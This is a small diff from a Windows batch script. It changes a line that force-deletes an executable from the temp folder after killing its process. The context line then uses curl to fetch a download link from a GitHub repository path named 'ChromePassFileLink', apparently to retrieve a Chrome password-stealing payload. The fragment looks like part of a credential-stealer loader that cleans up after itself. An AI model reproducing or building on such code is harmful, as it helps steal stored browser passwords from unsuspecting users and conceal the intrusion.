@@ -35,7 +35,7 @@ echo.
 
 :: Kill & Delete file 
 taskkill /f /im !filename!.exe
-del /f /q "%TEMP%\!filename!.exe"
+del /f /a /q "%TEMP%\!filename!.exe"
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ChromePassFileLink') do set "ChromePassFileLink=%%i"
 
